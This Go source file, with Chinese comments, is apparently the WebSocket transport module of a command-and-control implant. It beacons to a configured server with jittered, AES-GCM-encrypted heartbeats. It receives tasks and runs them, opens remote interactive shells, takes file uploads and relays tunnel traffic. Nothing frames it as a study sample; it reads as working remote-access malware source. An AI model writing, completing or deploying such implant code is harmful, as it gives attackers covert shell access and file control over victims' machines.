//go:build transport_ws

package main

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// ─── WebSocket 轮询通道（TSHL 帧 + AES-GCM，传输层 WS 升级）──────────
// 与 TCP 通道共用帧协议（encodePacket/compress/encrypt），区别仅在于：
//   - TCP：每条消息 = [4B len][1B type][AES-GCM]
//   - WS ：每条消息 = AES-GCM（WS 自身有消息边界，无长度前缀/类型字节）
// 心跳/任务/结果全部走 WS 消息，服务端 Listener（websocket 类型）解码。
//
// 构建标签 transport_ws 由构建器按 protocol=websocket 设置。

var (
	wsMu   sync.Mutex // 保护 wsConn 读写
	wsConn *websocket.Conn
)

// isWSTransport 判断 serverAddr 是否为 WebSocket 通道（ws:// 或 wss:// 前缀）。
func isWSTransport(s string) bool {
	t := strings.TrimSpace(s)
	return strings.HasPrefix(t, "ws://") || strings.HasPrefix(t, "wss://")
}

// isHTTPTransport stub：websocket 构建不含 HTTP 通道，恒 false。
func isHTTPTransport(s string) bool { return false }

// isMQTTTransport stub：websocket 构建不含 MQTT 通道，恒 false。
func isMQTTTransport(s string) bool { return false }

// mqttPollRun stub：websocket 构建不含 MQTT 通道。
func mqttPollRun() {}

// httpMode/httpPollRun/httpSendFrame stub：websocket 构建不含 HTTP 轮询通道，
// useHTTP 恒为 false，这些符号仅为满足 main.go 的编译引用。
var httpMode bool // 恒 false

func httpPollRun() {}

func httpSendFrame(p *Packet) bool { return false }

// wsSendFrame 发送一条 WS 消息 = AES-GCM(compress(encodePacket))。
// gorilla 允许读写并发（不同 goroutine），锁仅保护 wsConn 指针的读。
func wsSendFrame(p *Packet) bool {
	wsMu.Lock()
	conn := wsConn
	wsMu.Unlock()
	if conn == nil {
		return false
	}
	data := encodePacket(p)
	cmp, _ := compress(data)
	enc, err := encrypt(cmp)
	if err != nil {
		return false
	}
	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	return conn.WriteMessage(websocket.BinaryMessage, enc) == nil
}

// wsRecvFrame 接收一条 WS 消息并解析为 Packet。
// 注意：parsePacket 内部已完成 decrypt+decompress，这里直接传原始密文。
// 关键：不用 SetReadDeadline——gorilla 在读超时后会标记连接损坏（closeErr），
// 后续 ReadMessage 永久失败导致连接反复断开。WS 连接由心跳保持活跃，
// 死连接由服务端心跳超时回收。读操作永久阻塞在独立 goroutine（主循环），
// 写（心跳）在另一 goroutine 并发进行。
func wsRecvFrame() (*Packet, error) {
	wsMu.Lock()
	conn := wsConn
	wsMu.Unlock()
	if conn == nil {
		return nil, fmt.Errorf("ws not connected")
	}
	_, data, err := conn.ReadMessage()
	if err != nil {
		return nil, err
	}
	return parsePacket(data)
}

// wsPollRun WebSocket 通道主循环：注册 → 心跳+收帧 → 任务分发。
// 任务通过 taskCh 交给 taskWorker 执行（与 TCP 共用，重活任务池化生效）。
// 注意：wsPollRun 是独立通道路径（不经 run() 的 TCP 分支），必须自建 taskCh。
func wsPollRun() {
	// 自建任务队列 + worker（与 TCP 分支一致；已存在则复用）
	if taskCh == nil {
		gen := connGen.Add(1)
		taskCh = make(chan Task, 16)
		go taskWorker(gen)
	}
	defer func() {
		if taskCh != nil {
			close(taskCh)
			taskCh = nil
		}
	}()

	target := serverAddr
	if !strings.HasPrefix(target, "ws://") && !strings.HasPrefix(target, "wss://") {
		target = "ws://" + target
	}
	u, err := url.Parse(target)
	if err != nil {
		return
	}
	if u.Path == "" || u.Path == "/" {
		u.Path = "/"
	}

	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
	}
	conn, _, err := dialer.Dial(u.String(), nil)
	if err != nil {
		return
	}
	wsMu.Lock()
	wsConn = conn
	wsMu.Unlock()
	// 注册上行钩子：sendPacket/sendPacketSync 的 WS 通道路由
	wsSendFrameFn = wsSendFrame
	defer func() {
		wsSendFrameFn = nil
		wsMu.Lock()
		wsConn.Close()
		wsConn = nil
		wsMu.Unlock()
	}()

	// 注册
	if !wsSendFrame(buildRegisterPacket()) {
		return
	}

	// 心跳独立 goroutine：主循环 recvFrame 永久阻塞读，心跳不受影响
	hbStop := make(chan struct{})
	defer close(hbStop)
	go func() {
		lastHb := time.Now()
		hbInterval := jitteredInterval(interval)
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-hbStop:
				return
			case <-ticker.C:
				if time.Since(lastHb) >= hbInterval {
					wsSendFrame(&Packet{
						Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
						Version:   Version,
						Type:      TypeHeartbeat,
						ID:        sessionID,
						Timestamp: uint64(time.Now().UnixMilli()),
						Payload:   heartbeatPayload,
					})
					lastHb = time.Now()
					hbInterval = jitteredInterval(interval)
				}
			}
		}
	}()

	for {
		pkt, err := wsRecvFrame()
		if err != nil {
			// 连接错误：退出 wsPollRun，主循环重连
			return
		}
		if pkt == nil {
			continue
		}

		switch pkt.Type {
		case TypeTask:
			// 任务解码后入队（taskWorker 执行，重活池化）
			task, ok := parseTaskPayload(pkt.Payload)
			if ok && taskCh != nil {
				select {
				case taskCh <- task:
				default:
					// 队列满：直接同步执行（回退）
					executeAndSendResult(task, connGen.Load())
				}
			}
		case TypeShellOpen:
			handleShellOpen(pkt)
		case TypeShellData:
			handleShellData(pkt)
		case TypeShellClose:
			handleShellClose()
		case TypeFileUp:
			handleFileUp(pkt)
		case TypeTunnel:
			if len(pkt.Payload) >= 4 {
				totalLen := uint32(pkt.Payload[0])<<24 | uint32(pkt.Payload[1])<<16 | uint32(pkt.Payload[2])<<8 | uint32(pkt.Payload[3])
				if len(pkt.Payload) >= 4+int(totalLen) {
					processTunnelRaw(pkt.Payload[4 : 4+int(totalLen)])
				}
			}
		case TypeAck:
			touchRead()
		}
	}
}

// parseTaskPayload 解析任务帧 payload → Task（与服务端 protocol.Task 对齐）。
func parseTaskPayload(payload []byte) (Task, bool) {
	var t Task
	if err := json.Unmarshal(payload, &t); err != nil {
		return t, false
	}
	return t, true
}
